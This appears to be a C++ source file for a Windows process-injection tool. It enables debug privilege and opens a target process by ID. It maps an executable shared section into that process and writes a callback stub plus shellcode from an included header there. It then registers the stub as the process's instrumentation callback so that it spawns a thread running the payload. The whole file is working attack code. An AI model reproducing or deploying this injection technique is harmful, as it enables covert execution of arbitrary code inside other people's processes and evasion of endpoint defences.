#include "ntapi.hpp"
#include "otherapi.hpp"
#include "shellcode.hpp"

NTSTATUS EnableDebugPriv()
{
	HANDLE Token = NULL;
	TOKEN_PRIVILEGES NewState = { 0 };
	TOKEN_PRIVILEGES OldState = { 0 };
	ULONG ReturnSize = 0;
	NTSTATUS Status = NtOpenProcessTokenEx(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, NULL, &Token);
	if (!NT_SUCCESS(Status))
		return Status;

	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Luid.LowPart = SE_DEBUG_PRIVILEGE;
	NewState.Privileges[0].Luid.HighPart = 0;
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Status = NtAdjustPrivilegesToken(Token, FALSE, &NewState, sizeof(TOKEN_PRIVILEGES), &OldState, &ReturnSize);
	NtClose(Token);

	dprintf(L"[*] Adjust: 0x%08x\n", Status);
	return Status;
}

int __cdecl wmain(int argc, wchar_t* argv[])
{
	PEB Peb = { 0 };
	NTSTATUS Status = 0;
	ULONG ProcessId = 0;
	HANDLE hProcess = 0;
	CLIENT_ID ClientId = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	HANDLE SectionHandle = NULL;
	SIZE_T Size = 0;
	LARGE_INTEGER SectionMaxLength = { 0 };
	PVOID LocalPointer = NULL;
	PVOID RemotePointer = NULL;
	PVOID bAddress = 0;
	PUCHAR finalCallback = (PUCHAR)RtlAllocateHeap(RtlProcessHeap(), 0, sizeof(callback) + sizeof(buf) + 8);
	PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION RemoteProcessInstrumentationCallback = { 0 };

	// We assume x86/x64 only and ignore other's arch...
	BOOL Isx86NativeSystem = FALSE;
	ULONG OSMajorVersion = SharedUserData->NtMajorVersion;
	ULONG OSMinorVersion = SharedUserData->NtMinorVersion;

	// http://www.rohitab.com/discuss/topic/40881-a-quick-way-to-detect-64-bit-windows/
	// https://blogs.blackberry.com/en/2018/03/windows-maps-64-bit-ntdll-to-wow64-process
	// https://wbenny.github.io/2018/11/04/wow64-internals.html
	if (OSMajorVersion > 6 || OSMajorVersion == 6 && OSMinorVersion >= 2)
	{
		Isx86NativeSystem = SharedUserData->NativeProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? FALSE : TRUE;
	}
	else
	{
		Isx86NativeSystem = !!(*(PVOID*)0x7ffe0300);
	}

	// win vista->win 8.1 (6000~9600) Loacl Inject require Administrators++ | SYSTEM
	// win vista->win 11+ (6000++) Remote Inject always require Administrators++ | SYSTEM
	// if (Isx86NativeSystem)
		// return STATUS_NOT_SUPPORTED;

	dprintf(L"[*] OS: %d.%d\n", OSMajorVersion, OSMinorVersion);
	//dprintf(L"[*] NativeProcessorArchitecture: 0x%04x, Old SystemCall: 0x%p\n", SharedUserData->NativeProcessorArchitecture, *(PVOID*)0x7ffe0300);
	if (OSMajorVersion < 6 || (Isx86NativeSystem && OSMajorVersion == 6))
	{
		Status = STATUS_NOT_SUPPORTED;
		return Status;
	}
	if (argc == 2 && argv[1])
	{
		ProcessId = _wtoi(argv[1]);
		if (Status = EnableDebugPriv(), Status != STATUS_SUCCESS)
		{
			dprintf(L"[-] Unable Toggle to Enable DebugPriv: 0x%08x\n", Status);
			return Status;
		}

		ClientId.UniqueProcess = UlongToHandle(ProcessId);
		ClientId.UniqueThread = 0;
		InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
		Status = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_INFORMATION | PROCESS_VM_OPERATION, &ObjectAttributes, &ClientId);
		if (!NT_SUCCESS(Status))
		{
			dprintf(L"[-] NtOpenProcess Failed: 0x%08x, ProcessId: %lld\n", Status, (ULONGLONG)ClientId.UniqueProcess);
			return Status;
		}
	}
	else
	{
		dprintf(L"[!] Trying Self Injection without ProcessId\n");
		if (OSMajorVersion == 6 && (Status = EnableDebugPriv(), Status != STATUS_SUCCESS))
		{
			dprintf(L"[-] Unable Toggle to Enable DebugPriv: 0x%08x\n", Status);
			return Status;
		}

		hProcess = NtCurrentProcess();
	}

	__try
	{
		ULONG_PTR RemoteWow64Peb = 0;
		ULONG_PTR LocalWow64Peb = 0;
		Status = NtQueryInformationProcess(NtCurrentProcess(), ProcessWow64Information, &LocalWow64Peb, sizeof(LocalWow64Peb), NULL);
		Status = NtQueryInformationProcess(hProcess, ProcessWow64Information, &RemoteWow64Peb, sizeof(RemoteWow64Peb), NULL);
		if (!NT_SUCCESS(Status) || (!!RemoteWow64Peb ^ !!LocalWow64Peb))
		{
			dprintf(L"[-] QueryWow64: 0x%08lx. Process Machine Bits unmatch! Remote: 0x%p -- Local: 0x%p\n", Status, (PVOID)RemoteWow64Peb, (PVOID)LocalWow64Peb);
			__leave;
		}
		//dprintf(L"[*] Remote: 0x%p -- Local: 0x%p\n", (PVOID)RemoteWow64Peb, (PVOID)LocalWow64Peb);
		//dprintf(L"[*] WOW32Reserved: 0x%p -- WowTebOffset: 0x%p\n", (PVOID)NtCurrentTeb()->WOW32Reserved, (PVOID)NtCurrentTeb()->WowTebOffset);
		PVOID InformationPtr = NULL;
		ULONG InformationLength = 0;

		Size = sizeof(callback) + sizeof(buf) + 16;
		SectionMaxLength.QuadPart = Size;
		Status = NtCreateSection(&SectionHandle, SECTION_ALL_ACCESS, NULL, &SectionMaxLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if (!NT_SUCCESS(Status))
			__leave;

		Status = NtMapViewOfSection(SectionHandle, NtCurrentProcess(), &LocalPointer, NULL, NULL, NULL, &Size, ViewUnmap, NULL, PAGE_READWRITE);
		if (!NT_SUCCESS(Status))
			__leave;

		Status = NtMapViewOfSection(SectionHandle, hProcess, &RemotePointer, NULL, NULL, NULL, &Size, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(Status))
			__leave;

		ULONG_PTR NtCreateThreadExAddress = (ULONG_PTR)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtCreateThreadEx");
		// = NtCreateThreadEx
#ifdef _WIN64
		Fastmemcpy((void*)&callback[2], (void*)&RemotePointer, sizeof(PVOID));
		Fastmemcpy((void*)&callback[12], (void*)&NtCreateThreadExAddress, sizeof(ULONG_PTR));
		Fastmemcpy(finalCallback, callback, sizeof(callback));
		Fastmemcpy((finalCallback + sizeof(callback)), buf, sizeof(buf));
		dprintf(L"[*] Remote Pointer: 0x%p\n", RemotePointer);

		//dprintf(L"sizeof(finalCallback) = %zd\n", sizeof(callback) + sizeof(buf2));
		Fastmemcpy((char*)LocalPointer + 8, finalCallback, sizeof(callback) + sizeof(buf));
#else
		Fastmemcpy((void*)&callback[11], (void*)&RemotePointer, sizeof(PVOID));
		Fastmemcpy((void*)&callback[16], (void*)&NtCreateThreadExAddress, sizeof(ULONG_PTR));
		Fastmemcpy(finalCallback, callback, sizeof(callback));
		Fastmemcpy((finalCallback + sizeof(callback)), buf, sizeof(buf));
		dprintf(L"[*] Remote Pointer: 0x%p\n", RemotePointer);
		//dprintf(L"sizeof(finalCallback) = %zd\n", sizeof(callback) + sizeof(buf2));
		Fastmemcpy((char*)LocalPointer + 8, finalCallback, sizeof(callback) + sizeof(buf));
		
		if (Isx86NativeSystem)
		{
			*(DWORD*)((char*)LocalPointer + 4) = 1;

		}
#endif
		// NT 6 x86 Native return STATUS_NOT_SUPPORTED always
		// Shellcode exitfunc=thread
		RemotePointer = (char*)RemotePointer + 8;
		RtlFreeHeap(RtlProcessHeap(), 0, finalCallback);
		
		if (OSMajorVersion == 6 || LocalWow64Peb)
		{
			wprintf(L"[!] Old\n");
			InformationPtr = &RemotePointer;
			InformationLength = sizeof(PVOID);
		}
		else
		{
			wprintf(L"[!] New\n");

			//
			// Version = 1 when Native x86 OS, unable to work well. (LdrInitializeThunk no return...)
			// 难道单独处理LdrInitializeThunk 就行了？md win32k/user32 KernelCallbackTable KiUserApcDispatcher也是问题cnm
			//

			RemoteProcessInstrumentationCallback.Version = Isx86NativeSystem ? 1 : 0;
			RemoteProcessInstrumentationCallback.Reserved = 0;
			RemoteProcessInstrumentationCallback.Callback = RemotePointer;

			InformationPtr = &RemoteProcessInstrumentationCallback;
			InformationLength = sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION);
		}

		Status = NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, InformationPtr, InformationLength);
		dprintf(L"[+] Set Callback = 0x%08lx\n", Status);
		if (!NT_SUCCESS(Status))
			__leave;

		while (!(*(PULONG)LocalPointer))
		{
			Status++;
			if(Status % 6 == 0)
				dprintf(L"Not created yet!\n");
			Sleep(1000);
		}

		dprintf(L"[+] Success in %ds\n", Status);

		// try to set NULL but...
		// win 8.1 后新增控制流保护, MmValidateUserCallTarget->CallBackAddress, 微软也没有特地为空地址绕过CFG检查，导致无法置空CallBackAddress
		// 你可以试试 VS 工程 C/C++ --> 代码生成 --> 更改 开启控制流防护 的设置，然后对比查看
		RemoteProcessInstrumentationCallback.Callback = RemotePointer = NULL;
		Status = NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, InformationPtr, InformationLength);
		dprintf(L"[*] Set NULL = 0x%08lx\n", Status);
	}
	__finally
	{
		if (hProcess && hProcess != INVALID_HANDLE_VALUE)
			NtClose(hProcess);
		
		if (SectionHandle)
			NtClose(SectionHandle);

		if (LocalPointer)
			NtUnmapViewOfSection(NtCurrentProcess(), LocalPointer);
	}

	// To be aware of test only
	if (hProcess == NtCurrentProcess())
		Sleep(1000);

	wprintf(L"Last Win32Error: %ld\n", NtCurrentTeb()->LastErrorValue);
	wprintf(L"Last NtstatusError: 0x%08lx\n", NtCurrentTeb()->LastStatusValue);
	
	return Status;
}